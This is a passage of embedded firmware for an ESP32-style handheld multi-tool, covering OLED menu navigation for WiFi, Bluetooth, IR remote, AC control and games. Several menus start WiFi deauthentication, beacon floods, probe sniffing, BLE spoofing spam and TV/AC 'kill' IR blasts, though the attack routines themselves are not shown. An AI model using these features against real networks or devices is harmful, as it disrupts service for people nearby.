      switch (oledState.greeField) {
        case 0: // Brand cycle backward
          oledState.acBrand = (oledState.acBrand - 1 + acBrandCount) % acBrandCount;
          addLog("[AC] Brand: %s", acBrandNames[oledState.acBrand]);
          break;
        case 1: // Toggle power
          oledState.greePower = !oledState.greePower;
          addLog("[GREE] Power %s", oledState.greePower ? "ON" : "OFF");
          break;
        case 2: // Temp down
          if (oledState.greeTemp > 16) oledState.greeTemp--;
          break;
        case 3: // Mode cycle backward
          oledState.greeMode = (oledState.greeMode - 1 + greeModeCount) % greeModeCount;
          addLog("[GREE] Mode: %s", greeModeNames[oledState.greeMode]);
          break;
        case 4: // Fan cycle backward
          oledState.greeFan = (oledState.greeFan - 1 + greeFanCount) % greeFanCount;
          addLog("[GREE] Fan: %s", greeFanNames[oledState.greeFan]);
          break;
      }
      break;
    }
    case MENU_DEAUTH: {
      // Decrement channel or rate
      if (oledState.cursor == 1 && deauthChannel > 1) deauthChannel--;
      if (oledState.cursor == 2 && deauthRate > 10) deauthRate -= 10;
      if (oledState.cursor == 3) deauthAllChannels = false;
      break;
    }
    case MENU_BEACON: {
      // Decrement count or cycle back
      if (oledState.cursor == 1 && beaconCount > 1) beaconCount--;
      if (oledState.cursor == 2) {
        const char* encs[] = {"OPEN","WPA2","WPA3","WPA2ENT"};
        int idx = 0;
        for (int i = 0; i < 4; i++) { if (beaconEncryption == encs[i]) { idx = i; break; } }
        idx = (idx - 1 + 4) % 4;
        beaconEncryption = encs[idx];
      }
      if (oledState.cursor == 3) beaconRandomSsids = false;
      break;
    }
    // All other screens: LEFT does nothing (use Back menu item + CENTER)
    default: break;
  }
  oledNeedsRedraw = true;
}

void oledNavigateCenter() {
  switch (oledState.screen) {
    case MENU_MAIN: {
      int page = oledState.mainMenuPage;
      int cursor = oledState.cursor;
      // Map card index to screen transition
      if (page == 0) {
        oledState.cursor = 0;
        oledState.scrollOffset = 0;
        switch (cursor) {
          case 0: oledState.screen = MENU_WIFI; break;
          case 1: oledState.screen = MENU_BT; break;
          case 2: oledState.screen = MENU_MUSIC; break;
          case 3: oledState.screen = MENU_GAMES; break;
          case 4: oledState.screen = MENU_ABOUT; break;
          case 5: oledState.screen = MENU_MORSE_NOTEBOOK; break;
        }
      } else {
        oledState.cursor = 0;
        oledState.scrollOffset = 0;
        switch (cursor) {
          case 0: oledState.screen = MENU_ATTACKS; break;
          case 1: oledState.screen = MENU_SYSTEM; break;
          case 2: oledState.screen = MENU_THEMES; break;
          case 3: oledState.screen = MENU_BLESPAM; break;
          case 4: oledState.screen = MENU_IR; break;
          case 5: oledState.screen = MENU_FREQ_TESTER; break;
        }
      }
      break;
    }
    
    case MENU_WIFI: {
      switch (oledState.cursor) {
        case 0: // Radio toggle
          wifiEnabled = !wifiEnabled;
          if (wifiEnabled) {
            WiFi.mode(WIFI_AP);
            WiFi.softAP(apSsid.c_str(), apPass.c_str());
            addLog("[OLED] WiFi ON");
          } else {
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_OFF);
            addLog("[OLED] WiFi OFF");
          }
          break;
        case 1: oledState.screen = MENU_WIFI_STATUS; break; // Status
        case 2: // Saved net
          if (staSsid.length() > 0) {
            WiFi.begin(staSsid.c_str(), staPass.c_str());
            addLog("[OLED] Connecting saved: %s", staSsid.c_str());
          }
          break;
        case 3: oledState.screen = MENU_WIFI_SCAN; oledState.cursor = 0; break; // Scan
        case 4: break; // AP Config (read-only on OLED, use web)
        case 5: oledState.screen = MENU_MAIN; break; // Back
      }
      break;
    }
    
    case MENU_BT: {
      switch (oledState.cursor) {
        case 0: // Radio toggle
          if (btEnabled) {
            stopBleAdvertising();
          } else {
            startBleAdvertising();
          }
          break;
        case 1: break; // Name (read-only)
        case 2: oledState.screen = MENU_BT_SCAN; oledState.cursor = 0; break;
        case 3: oledState.screen = MENU_BT_PAIRED; break;
        case 4: oledState.screen = MENU_MAIN; break;
      }
      break;
    }
    
    case MENU_ATTACKS: {
      switch (oledState.cursor) {
        case 0: oledState.screen = MENU_DEAUTH; break;
        case 1: oledState.screen = MENU_BEACON; break;
        case 2: oledState.screen = MENU_HOP; break;
        case 3: oledState.screen = MENU_PROBE; break;
        case 4: oledState.screen = MENU_MAIN; break;
      }
      oledState.cursor = 0;
      break;
    }
    
    case MENU_DEAUTH: {
      if (oledState.cursor == 4) {
        if (deauthRunning) {
          stopDeauth();
        } else {
          startDeauth();
        }
      }
      break;
    }
    
    case MENU_BEACON: {
      if (oledState.cursor == 4) {
        if (beaconRunning) {
          stopBeaconFlood();
        } else {
          startBeaconFlood();
        }
      }
      break;
    }
    
    case MENU_HOP: {
      if (oledState.cursor == 1) {
        if (channelHoppingRunning) {
          stopChannelHopping();
        } else {
          startChannelHopping();
        }
      }
      break;
    }
    
    case MENU_PROBE: {
      if (oledState.cursor == 1) {
        if (probeSniffing) {
          stopProbeSniffer();
        } else {
          startProbeSniffer();
        }
      }
      break;
    }
    
    case MENU_BLESPAM: {
      int item = oledState.cursor;
      if (item >= 0 && item <= 7) {
        // Toggle
        switch (item) {
          case 0: airtagSpamRunning = !airtagSpamRunning; addLog("[OLED] AirTag %s", airtagSpamRunning?"ON":"OFF"); break;
          case 1: smarttagSpamRunning = !smarttagSpamRunning; addLog("[OLED] SmartTag %s", smarttagSpamRunning?"ON":"OFF"); break;
          case 2: swiftpairSpamRunning = !swiftpairSpamRunning; addLog("[OLED] SwiftPair %s", swiftpairSpamRunning?"ON":"OFF"); break;
          case 3: googleFastPairRunning = !googleFastPairRunning; addLog("[OLED] FastPair %s", googleFastPairRunning?"ON":"OFF"); break;
          case 4: ibeaconRunning = !ibeaconRunning; addLog("[OLED] iBeacon %s", ibeaconRunning?"ON":"OFF"); break;
          case 5: eddystoneRunning = !eddystoneRunning; addLog("[OLED] Eddystone %s", eddystoneRunning?"ON":"OFF"); break;
          case 6: bleSpamRunning = !bleSpamRunning; addLog("[OLED] PairFlood %s", bleSpamRunning?"ON":"OFF"); break;
          case 7: bleNameRandomizerRunning = !bleNameRandomizerRunning; addLog("[OLED] NameRand %s", bleNameRandomizerRunning?"ON":"OFF"); break;
        }
      } else if (item == 8) {
        // Stop all
        airtagSpamRunning = false; smarttagSpamRunning = false; swiftpairSpamRunning = false;
        googleFastPairRunning = false; ibeaconRunning = false; eddystoneRunning = false;
        bleSpamRunning = false;
        addLog("[OLED] All BLE spam stopped");
      } else if (item == 9) {
        oledState.screen = MENU_MAIN;
      }
      break;
    }
    
    case MENU_IR: {
      switch (oledState.cursor) {
        case 0: // Scanner toggle
          irReading = !irReading;
          if (irReading) irrecv.enableIRIn(); else irrecv.disableIRIn();
          addLog("[OLED] IR Scanner %s", irReading?"ON":"OFF");
          break;
        case 1: oledState.screen = MENU_IR_SEND; break;
        case 2: oledState.screen = MENU_GREE; break;
        case 3: oledState.screen = MENU_IR_KILL; break;
        case 4: oledState.screen = MENU_REMOTES; break;
        case 5: oledState.screen = MENU_SIGNALS; break;
        case 6: oledState.screen = MENU_PROJECTORS; break;
        case 7: oledState.screen = MENU_MAIN; break;
      }
      oledState.cursor = 0;
      break;
    }
    
    case MENU_IR_SEND: {
      if (oledState.cursor == 0 && lastIrValue != "0" && lastIrValue != "--") {
        // Resend last
        String hexStr = lastIrValue;
        if (hexStr.startsWith("0x")) hexStr = hexStr.substring(2);
        uint64_t val = strtoull(hexStr.c_str(), NULL, 16);
        irsend.sendNEC(val, lastIrBits > 0 ? lastIrBits : 32);
        addLog("[OLED] Resent: 0x%s", lastIrValue.c_str());
      } else if (oledState.cursor == 1) {
        // Samsung Power
        irsend.sendNEC(0xE0E040BF, 32);
        addLog("[OLED] Sent Samsung Power");
      } else if (oledState.cursor == 2) {
        // LG AC Power
        irsend.sendNEC(0x20DF10EF, 32);
        addLog("[OLED] Sent LG AC Power");
      }
      break;
    }
    
    case MENU_GREE: {
      if (oledState.greeField == 5) {
        // SEND - brand-specific AC command
        bool power = oledState.greePower;
        uint8_t temp = (uint8_t)oledState.greeTemp;
        int mode = oledState.greeMode;
        int fan = oledState.greeFan;
        int brand = oledState.acBrand;
        
        addLog("[AC] Sending brand=%s pwr=%d tmp=%d mode=%d fan=%d", acBrandNames[brand], power, temp, mode, fan);
        
        switch (brand) {
          case 0: { // GREE
            greeAC.setPower(power);
            greeAC.setTemp(temp);
            switch (mode) {
              case 0: greeAC.setMode(kGreeCool); break;
              case 1: greeAC.setMode(kGreeDry); break;
              case 2: greeAC.setMode(kGreeFan); break;
              case 3: greeAC.setMode(kGreeAuto); break;
            }
            switch (fan) {
              case 0: greeAC.setFan(kGreeFanAuto); break;
              case 1: greeAC.setFan(kGreeFanMin); break;
              case 2: greeAC.setFan(kGreeFanMed); break;
              case 3: greeAC.setFan(kGreeFanMax); break;
            }
            greeAC.send();
            break;
          }
          case 1: { // COOLIX (Midea / Pel / Dawlance / Kenwood / EcoStar)
            coolixAC.setPower(power);
            coolixAC.setTemp(temp);
            switch (mode) {
              case 0: coolixAC.setMode(kCoolixCool); break;
              case 1: coolixAC.setMode(kCoolixDry); break;
              case 2: coolixAC.setMode(kCoolixFan); break;
              case 3: coolixAC.setMode(kCoolixAuto); break;
            }
            switch (fan) {
              case 0: coolixAC.setFan(kCoolixFanAuto); break;
              case 1: coolixAC.setFan(kCoolixFanMin); break;
              case 2: coolixAC.setFan(kCoolixFanMed); break;
              case 3: coolixAC.setFan(kCoolixFanMax); break;
            }
            coolixAC.send();
            break;
          }
          case 2: { // HAIER - use IRac for full state control
            irac.next.protocol = decode_type_t::HAIER_AC;
            irac.next.power = power;
            irac.next.degrees = temp;
            switch (mode) {
              case 0: irac.next.mode = stdAc::opmode_t::kCool; break;
              case 1: irac.next.mode = stdAc::opmode_t::kDry; break;
              case 2: irac.next.mode = stdAc::opmode_t::kFan; break;
              case 3: irac.next.mode = stdAc::opmode_t::kAuto; break;
            }
            switch (fan) {
              case 0: irac.next.fanspeed = stdAc::fanspeed_t::kAuto; break;
              case 1: irac.next.fanspeed = stdAc::fanspeed_t::kMin; break;
              case 2: irac.next.fanspeed = stdAc::fanspeed_t::kLow; break;
              case 3: irac.next.fanspeed = stdAc::fanspeed_t::kHigh; break;
            }
            irac.next.swingv = stdAc::swingv_t::kOff;
            irac.next.swingh = stdAc::swingh_t::kOff;
            irac.next.light = false;
            irac.next.sleep = -1;
            irac.sendAc();
            break;
          }
          case 3: { // HAIER160 - use IRac with HAIER_AC protocol
            irac.next.protocol = decode_type_t::HAIER_AC;
            irac.next.power = power;
            irac.next.degrees = temp;
            switch (mode) {
              case 0: irac.next.mode = stdAc::opmode_t::kCool; break;
              case 1: irac.next.mode = stdAc::opmode_t::kDry; break;
              case 2: irac.next.mode = stdAc::opmode_t::kFan; break;
              case 3: irac.next.mode = stdAc::opmode_t::kAuto; break;
            }
            switch (fan) {
              case 0: irac.next.fanspeed = stdAc::fanspeed_t::kAuto; break;
              case 1: irac.next.fanspeed = stdAc::fanspeed_t::kMin; break;
              case 2: irac.next.fanspeed = stdAc::fanspeed_t::kLow; break;
              case 3: irac.next.fanspeed = stdAc::fanspeed_t::kHigh; break;
            }
            irac.next.swingv = stdAc::swingv_t::kOff;
            irac.next.swingh = stdAc::swingh_t::kOff;
            irac.next.light = false;
            irac.next.sleep = -1;
            irac.sendAc();
            break;
          }
          case 4: { // KELVINATOR (Orient / Changhong Ruba)
            kelvinatorAC.setPower(power);
            kelvinatorAC.setTemp(temp);
            switch (mode) {
              case 0: kelvinatorAC.setMode(kKelvinatorCool); break;
              case 1: kelvinatorAC.setMode(kKelvinatorDry); break;
              case 2: kelvinatorAC.setMode(kKelvinatorFan); break;
              case 3: kelvinatorAC.setMode(kKelvinatorAuto); break;
            }
            switch (fan) {
              case 0: kelvinatorAC.setFan(kKelvinatorFanAuto); break;
              case 1: kelvinatorAC.setFan(kKelvinatorFanMin); break;
              case 2: kelvinatorAC.setFan(kKelvinatorFanMin); break; // No Med, use Min
              case 3: kelvinatorAC.setFan(kKelvinatorFanMax); break;
            }
            kelvinatorAC.send();
            break;
          }
          case 5: { // UNIVERSAL - use IRac to build a common AC command
            // Use IRac to create a universal-ish AC command
            irac.next.protocol = decode_type_t::COOLIX;
            irac.next.power = power;
            irac.next.degrees = temp;
            switch (mode) {
              case 0: irac.next.mode = stdAc::opmode_t::kCool; break;
              case 1: irac.next.mode = stdAc::opmode_t::kDry; break;
              case 2: irac.next.mode = stdAc::opmode_t::kFan; break;
              case 3: irac.next.mode = stdAc::opmode_t::kAuto; break;
            }
            switch (fan) {
              case 0: irac.next.fanspeed = stdAc::fanspeed_t::kAuto; break;
              case 1: irac.next.fanspeed = stdAc::fanspeed_t::kMin; break;
              case 2: irac.next.fanspeed = stdAc::fanspeed_t::kMedium; break;
              case 3: irac.next.fanspeed = stdAc::fanspeed_t::kMax; break;
            }
            irac.next.swingv = stdAc::swingv_t::kOff;
            irac.next.swingh = stdAc::swingh_t::kOff;
            irac.next.light = false;
            irac.next.sleep = -1;
            irac.sendAc();
            break;
          }
        }
        addLog("[AC] Sent: %s", acBrandNames[brand]);
      } else if (oledState.greeField == 6) {
        // Back to IR menu
        oledState.screen = MENU_IR;
        oledState.cursor = 2;
        oledState.scrollOffset = 0;
        addLog("[OLED] Back from ACs");
      }
      break;
    }
    
    case MENU_TVBGONE: {
      if (oledState.cursor == 1) {
        if (tvbgoneRunning) {
          tvbgoneRunning = false;
        } else {
          tvbgoneRunning = true;
          tvbgoneIndex = 0;
        }
        addLog("[OLED] TV-B-Gone %s", tvbgoneRunning?"START":"STOP");
      }
      break;
    }
    
    case MENU_COOLBEGONE: {
      if (oledState.cursor == 1) {
        if (coolBeGoneRunning) {
          coolBeGoneRunning = false;
        } else {
          coolBeGoneRunning = true;
        }
        addLog("[OLED] CoolBeGone %s", coolBeGoneRunning?"START":"STOP");
      }
      break;
    }
    
    case MENU_IR_KILL: {
      if (oledState.cursor == 0) {
        // Toggle TV-B-Gone
        if (tvbgoneRunning) {
          tvbgoneRunning = false;
        } else {
          tvbgoneRunning = true;
          tvbgoneIndex = 0;
        }
        addLog("[OLED] TV-B-Gone %s", tvbgoneRunning?"START":"STOP");
      } else if (oledState.cursor == 1) {
        // Toggle CoolBeGone
        if (coolBeGoneRunning) {
          coolBeGoneRunning = false;
        } else {
          coolBeGoneRunning = true;
        }
        addLog("[OLED] CoolBeGone %s", coolBeGoneRunning?"START":"STOP");
      } else if (oledState.cursor == 2) {
        // Back to IR menu
        oledState.screen = MENU_IR;
        oledState.cursor = 3;
        oledState.scrollOffset = 0;
        addLog("[OLED] Back from IR Kill");
      }
      break;
    }
    
    case MENU_REMOTES: {
      // Enter remote buttons screen
      oledState.remoteIdx = oledState.cursor;
      oledState.cursor = 0;
      oledState.scrollOffset = 0;
      oledState.screen = MENU_REMOTE_BUTTONS;
      break;
    }
    
    case MENU_REMOTE_BUTTONS: {
      // Blast IR for selected button
      DynamicJsonDocument doc(4096);
      deserializeJson(doc, remotesJson);
      JsonObject root = doc.as<JsonObject>();
      int idx = 0;
      for (JsonPair p : root) {
        if (idx == oledState.remoteIdx) {
          JsonArray buttons = p.value()["buttons"].as<JsonArray>();
          if (oledState.cursor < buttons.size()) {
            const char* signal = buttons[oledState.cursor]["signal"] | "";
            if (strlen(signal) > 0) {
              // Try to send the signal
              String hexStr = signal;
              if (hexStr.startsWith("0x")) hexStr = hexStr.substring(2);
              uint64_t val = strtoull(hexStr.c_str(), NULL, 16);
              if (val > 0) {
                irsend.sendNEC(val, 32);
                addLog("[OLED] Remote blast: 0x%s", hexStr.c_str());
              } else {
                // Try mapped signals
                if (strcmp(signal, "Samsung Power") == 0) irsend.sendNEC(0xE0E040BF, 32);
                else if (strcmp(signal, "Samsung Volume Up") == 0) irsend.sendNEC(0xE0E048B7, 32);
                else if (strcmp(signal, "LG AC Power") == 0) irsend.sendNEC(0x20DF10EF, 32);
                else if (strcmp(signal, "Sony TV Power") == 0) irsend.sendSony(0xA90, 12);
                addLog("[OLED] Remote blast: %s", signal);
              }
            }
          }
          break;
        }
        idx++;
      }
      break;
    }
    
    case MENU_SIGNALS: {
      if (oledState.cursor == 0) {
        // Capture and auto-save to library
        captureAndAutoSaveToLibrary();
      } else {
        // Playback cloned signal using saved protocol + bits
        int sigIndex = oledState.cursor - 1;
        DynamicJsonDocument doc(4096);
        DeserializationError err = deserializeJson(doc, signalsJson);
        if (!err && sigIndex < doc.size()) {
          JsonObject sig = doc[sigIndex];
          const char* valStr = sig["value"] | "0";
          uint64_t rawValue = 0;
          if (strncmp(valStr, "0x", 2) == 0 || strncmp(valStr, "0X", 2) == 0) {
            rawValue = strtoull(valStr + 2, NULL, 16);
          } else {
            rawValue = strtoull(valStr, NULL, 16);
          }
          int bitLength = sig["bits"] | 32;
          int protocolType = sig["protocol"] | 0;
          
          addLog("[SIGNALS] Blast: %s proto=%d val=0x%llX bits=%d", 
                 ((const char*)(sig["name"] | "?")), protocolType, rawValue, bitLength);
          
          irsend.send((decode_type_t)protocolType, rawValue, bitLength);
        }
      }
      break;
    }
    
    case MENU_THEMES: {
      if (oledState.cursor < MAX_THEMES) {
        saveThemeIndex(oledState.cursor);
        addLog("[OLED] Theme: %d", oledState.cursor);
      } else if (oledState.cursor == MAX_THEMES) {
        oledState.screen = MENU_MAIN;
        oledState.cursor = 5;
        oledState.scrollOffset = 0;
      }
      break;
    }
    
    case MENU_MUSIC: {
      if (oledState.cursor >= songCount) {
        // Back button
        oledState.screen = MENU_MAIN;
        oledState.cursor = 0;
        oledState.scrollOffset = 0;
        break;
      }
      // Select and auto-play song
      int selectedSong = oledState.cursor;
      if (selectedSong == musicSongIndex && musicPlaying) {
        // Same song selected while playing -> stop it
        musicPlaying = false;
        noTone(BUZZER_PIN);
        addLog("[MUSIC] Stopped: %s", songNames[musicSongIndex]);
      } else {
        // Different song or stopped -> start playing
        musicSongIndex = selectedSong;
        musicNoteIndex = 0;
        musicPlaying = true;
        lastMusicTick = 0;
        addLog("[MUSIC] Playing: %s", songNames[musicSongIndex]);
      }
      break;
    }
    
    case MENU_SYSTEM: {
      switch (oledState.cursor) {
        case 0: oledState.screen = MENU_STATS; break;
        case 1: oledState.screen = MENU_LOG; break;
        case 2: oledState.confirmAction = 0; oledState.screen = MENU_CONFIRM; break;
        case 3: oledState.confirmAction = 1; oledState.screen = MENU_CONFIRM; break;
        case 4: oledState.screen = MENU_MAIN; break;
      }
      oledState.cursor = 0;
      break;
    }
    
    case MENU_PROJECTORS: {
      if (oledState.projField == 1) {
        // Power ON - single press
        irsend.sendNEC(projPowerOn[oledState.projBrand], 32);
        addLog("[PROJ] Power ON: %s", projBrandNames[oledState.projBrand]);
      } else if (oledState.projField == 2) {
        // Power OFF - double press with 800ms delay
        irsend.sendNEC(projPowerOff[oledState.projBrand], 32);
        delay(800); // Corrected timing window for hardware prompt confirmation
        irsend.sendNEC(projPowerOff[oledState.projBrand], 32);
        addLog("[PROJ] Power OFF: %s (double-tap)", projBrandNames[oledState.projBrand]);
      } else if (oledState.projField == 3) {
        // Back to IR menu
        oledState.screen = MENU_IR;
        oledState.cursor = 6;
        oledState.scrollOffset = 0;
        addLog("[OLED] Back from Projectors");
      }
      break;
    }
    
    case MENU_GAMES: {
      // Games submenu
      if (oledState.cursor == 0) {
        // Start Tetris
        oledState.screen = MENU_TETRIS;
        tetrisStartGame();
      } else if (oledState.cursor == 1) {
        // Start Super Mario
        oledState.screen = MENU_MARIO;
        marioStartGame();
      } else if (oledState.cursor == 2) {
        oledState.screen = MENU_MAIN;
        oledState.mainMenuPage = 1;
        oledState.cursor = 3;
      }
      break;
    }
    
    case MENU_CONFIRM: {
      if (oledState.cursor == 0) { // YES
        if (oledState.confirmAction == 0) {
          addLog("[OLED] Rebooting...");
          ESP.restart();
        } else if (oledState.confirmAction == 1) {
          prefs.begin("zwisser", false);
          prefs.clear();
          prefs.end();
          addLog("[OLED] Factory reset");
          delay(500);
          ESP.restart();
        }
      } else { // NO
        oledState.screen = MENU_SYSTEM;
        oledState.cursor = 0;
      }
      break;
    }
    
    default: break;
  }
  oledNeedsRedraw = true;
}

void oledNavigateUp() {
  switch (oledState.screen) {
    case MENU_MAIN: {
      int page = oledState.mainMenuPage;
      int count = mainMenuCardCounts[page];
      if (oledState.cursor >= 3) oledState.cursor -= 3;
      // If going up from row 0, wrap to bottom row
      if (oledState.cursor < 0) {
        oledState.cursor = count - 1;
        if (oledState.cursor >= 6) oledState.cursor = 5; // max index for 2 rows
        if (oledState.cursor >= 3) oledState.cursor = count >= 6 ? 5 : count - 1;
      }
      break;
    }
    case MENU_PROJECTORS: {
      if (oledState.projField > 0) oledState.projField--;
      break;
    }
    case MENU_GREE: {
      if (oledState.greeField > 0) oledState.greeField--;
      break;
    }
    default: {
      if (oledState.cursor > 0) oledState.cursor--;
      break;
    }
  }
  oledNeedsRedraw = true;
}

void oledNavigateDown() {
  int maxCursor = 0;
  switch (oledState.screen) {
    case MENU_MAIN: {
      int page = oledState.mainMenuPage;
      int count = mainMenuCardCounts[page];
      if (oledState.cursor < 3) {
        int newCursor = oledState.cursor + 3;
        if (newCursor < count) oledState.cursor = newCursor;
      }
      // Wrap: if on bottom row and going down, wrap to top
      int bottomStart = count >= 6 ? 3 : (count >= 3 ? 3 : 0);
      if (oledState.cursor >= bottomStart && oledState.cursor < count) {
        // already handled above
      }
      return;
    }
    case MENU_WIFI: maxCursor = wifiMenuItemCount - 1; break;
    case MENU_WIFI_SCAN: maxCursor = 50; break;
    case MENU_BT: maxCursor = btMenuItemCount - 1; break;
    case MENU_BT_SCAN: maxCursor = 50; break;
    case MENU_BT_PAIRED: maxCursor = 19; break;
    case MENU_ATTACKS: maxCursor = attacksMenuItemCount - 1; break;
    case MENU_DEAUTH: maxCursor = 4; break;
    case MENU_BEACON: maxCursor = 4; break;
    case MENU_HOP: maxCursor = 1; break;
    case MENU_PROBE: maxCursor = 1; break;
    case MENU_BLESPAM: maxCursor = bleSpamItemCount - 1; break;
    case MENU_IR: maxCursor = irMenuItemCount - 1; break;
    case MENU_IR_SEND: maxCursor = 2; break;
    case MENU_TVBGONE: maxCursor = 1; break;
    case MENU_COOLBEGONE: maxCursor = 1; break;
    case MENU_IR_KILL: maxCursor = 2; break;
    case MENU_REMOTES: maxCursor = 19; break;
    case MENU_REMOTE_BUTTONS: maxCursor = 19; break;
    case MENU_SIGNALS: maxCursor = 30; break;
    case MENU_THEMES: maxCursor = MAX_THEMES; break;
    case MENU_SYSTEM: maxCursor = systemMenuItemCount - 1; break;
    case MENU_CONFIRM: maxCursor = 1; break;
    case MENU_MUSIC: maxCursor = songCount; break;
    case MENU_FREQ_TESTER: maxCursor = 0; break;
    case MENU_GAMES: maxCursor = gamesMenuItemCount - 1; break;
    case MENU_PROJECTORS: {
      if (oledState.projField < 3) oledState.projField++;
      return;
    }
    case MENU_GREE: {
      if (oledState.greeField < 6) oledState.greeField++;
      return;
    }
    default: break;
  }
  if (oledState.cursor < maxCursor) oledState.cursor++;
  oledNeedsRedraw = true;
}

void oledNavigateRight() {
  // Right adjusts values on config screens. On menu screens, act like DOWN.
  switch (oledState.screen) {
    case MENU_MAIN: {
      // Move cursor right in grid, or flip page if at rightmost column
      int page = oledState.mainMenuPage;
      int count = mainMenuCardCounts[page];
      int col = oledState.cursor % 3;
      int row = oledState.cursor / 3;
      int target = oledState.cursor + 1;
      if (col < 2 && target < count) {
        // Move right within same row
        oledState.cursor = target;
      } else if (page < 1) {
        // At rightmost column or end of row, flip to next page
        oledState.mainMenuPage++;
        int newCount = mainMenuCardCounts[page + 1];
        // Position at leftmost column on same row, or 0
        target = row * 3;
        if (target >= newCount) target = 0;
        if (target < 0) target = 0;
        oledState.cursor = target;
      }
      break;
    }
    case MENU_PROJECTORS: {
      // Cycle brand forward
      if (oledState.projField == 0) {
        oledState.projBrand = (oledState.projBrand + 1) % projBrandCount;
        addLog("[PROJ] Brand: %s", projBrandNames[oledState.projBrand]);
      }
      break;
    }
    case MENU_GREE: {
      // Adjust the current field value
      switch (oledState.greeField) {
        case 0: // Brand cycle forward
          oledState.acBrand = (oledState.acBrand + 1) % acBrandCount;
          addLog("[AC] Brand: %s", acBrandNames[oledState.acBrand]);
          break;
        case 1: // Toggle power
          oledState.greePower = !oledState.greePower;
          addLog("[GREE] Power %s", oledState.greePower ? "ON" : "OFF");
          break;
        case 2: // Temp up
          if (oledState.greeTemp < 30) oledState.greeTemp++;
          break;
        case 3: // Mode cycle
          oledState.greeMode = (oledState.greeMode + 1) % greeModeCount;
          addLog("[GREE] Mode: %s", greeModeNames[oledState.greeMode]);
          break;
        case 4: // Fan cycle
          oledState.greeFan = (oledState.greeFan + 1) % greeFanCount;
          addLog("[GREE] Fan: %s", greeFanNames[oledState.greeFan]);
          break;
      }
      break;
    }
    case MENU_DEAUTH: {
      // Adjust channel or rate
      if (oledState.cursor == 1 && deauthChannel < 13) deauthChannel++;
      if (oledState.cursor == 2 && deauthRate < 1000) deauthRate += 10;
      if (oledState.cursor == 3) deauthAllChannels = true;
      break;
    }
    case MENU_BEACON: {
      if (oledState.cursor == 1 && beaconCount < 30) beaconCount++;
      if (oledState.cursor == 2) {
        const char* encs[] = {"OPEN","WPA2","WPA3","WPA2ENT"};
        int idx = 0;
        for (int i = 0; i < 4; i++) { if (beaconEncryption == encs[i]) { idx = i; break; } }
        idx = (idx + 1) % 4;
        beaconEncryption = encs[idx];
      }
      if (oledState.cursor == 3) beaconRandomSsids = true;
      break;
    }
    default:
      break;
  }
  oledNeedsRedraw = true;
}

void oledHandleInput() {
  // When in Mario mode, route input to Mario handler
  if (oledState.screen == MENU_MARIO || oledState.screen == MENU_MARIO_GAMEOVER || oledState.screen == MENU_MARIO_WIN) {
    marioHandleInput();
    oledWakeUp();
    btnUpPressed = false;
    btnDownPressed = false;
    btnLeftPressed = false;
    btnRightPressed = false;
    btnCenterPressed = false;
    return;
  }
  
  // When in Tetris mode, route input to Tetris handler
  if (oledState.screen == MENU_TETRIS) {
    tetrisHandleInput();
    oledWakeUp();
    btnUpPressed = false;
    btnDownPressed = false;
    btnLeftPressed = false;
    btnRightPressed = false;
    btnCenterPressed = false;
    return;
  }
  
  // When in Morse Notebook mode, route input to Morse handler
  if (oledState.screen == MENU_MORSE_NOTEBOOK) {
    handleMorseNotebookInput();
    oledWakeUp();
    oledNeedsRedraw = true;
    return;
  }
  
  // When in Freq Tester mode, route input to Freq Tester handler
  if (oledState.screen == MENU_FREQ_TESTER) {
    handleFreqTesterInput();
    oledWakeUp();
    oledNeedsRedraw = true;
    return;
  }
  
  // Left button hold-to-back detection
  unsigned long now = millis();
  if (btnLeftState == LOW) {
    // Left button is being held down
    if (!btnLeftHeld) {
      btnLeftHeld = true;
      btnLeftHoldStart = now;
    } else if (now - btnLeftHoldStart >= BTN_LEFT_HOLD_MS) {
      // Held for 1.5s -> go back
      btnLeftHeld = false;
      oledGoBack();
      oledWakeUp();
      btnLeftPressed = false;
      btnUpPressed = false;
      btnDownPressed = false;
      btnRightPressed = false;
      btnCenterPressed = false;
      return;
    }
  } else {
    btnLeftHeld = false;
  }
  
  // Normal menu navigation
  if (btnUpPressed) { oledNavigateUp(); oledWakeUp(); btnUpPressed = false; }
  else if (btnDownPressed) { oledNavigateDown(); oledWakeUp(); btnDownPressed = false; }
  else if (btnLeftPressed) { oledNavigateLeft(); oledWakeUp(); btnLeftPressed = false; }
  else if (btnRightPressed) { oledNavigateRight(); oledWakeUp(); btnRightPressed = false; }
  else if (btnCenterPressed) { oledNavigateCenter(); oledWakeUp(); btnCenterPressed = false; }
}

void oledUpdate() {
  oledCheckScreensaver();
  
  if (oledOff) return; // screen is off, don't draw
  
  if (!oledNeedsRedraw && millis() - oledLastDraw < OLED_FRAME_MS) return;
  
  switch (oledState.screen) {
    case MENU_MAIN: oledRenderMain(); break;
    case MENU_WIFI: oledRenderWiFi(); break;
    case MENU_WIFI_STATUS: oledRenderWiFiStatus(); break;
    case MENU_WIFI_SCAN: oledRenderWiFiScan(); break;
    case MENU_BT: oledRenderBT(); break;
    case MENU_BT_SCAN: oledRenderBTScan(); break;
    case MENU_BT_PAIRED: oledRenderBTPaired(); break;
    case MENU_ATTACKS: oledRenderAttacks(); break;
    case MENU_DEAUTH: oledRenderDeauth(); break;
    case MENU_BEACON: oledRenderBeacon(); break;
    case MENU_HOP: oledRenderHop(); break;
    case MENU_PROBE: oledRenderProbe(); break;
    case MENU_BLESPAM: oledRenderBLESpam(); break;
    case MENU_IR: oledRenderIR(); break;
    case MENU_IR_SEND: oledRenderIRSend(); break;
    case MENU_GREE: oledRenderGree(); break;
    case MENU_TVBGONE: oledRenderTVBgone(); break;
    case MENU_COOLBEGONE: oledRenderCoolBeGone(); break;
    case MENU_IR_KILL: oledRenderIRKill(); break;
    case MENU_REMOTES: oledRenderRemotes(); break;
    case MENU_REMOTE_BUTTONS: oledRenderRemoteButtons(); break;
    case MENU_SIGNALS: oledRenderSignals(); break;
    case MENU_PROJECTORS: oledRenderProjectors(); break;
    case MENU_THEMES: oledRenderThemes(); break;
    case MENU_MUSIC: oledRenderMusic(); break;
    case MENU_SYSTEM: oledRenderSystem(); break;
    case MENU_STATS: oledRenderStats(); break;
    case MENU_LOG: oledRenderLog(); break;
    case MENU_CONFIRM: oledRenderConfirm(); break;
    case MENU_GAMES: oledRenderGames(); break;
    case MENU_TETRIS: oledRenderTetris(); break;
    case MENU_MARIO: oledRenderMario(); break;
    case MENU_MARIO_GAMEOVER: oledRenderMarioGameOver(); break;
    case MENU_MARIO_WIN: oledRenderMarioWin(); break;
    case MENU_MORSE_NOTEBOOK: oledRenderMorseNotebook(); break;
    case MENU_FREQ_TESTER: oledRenderFreqTester(); break;
    case MENU_ABOUT: oledRenderAbout(); break;
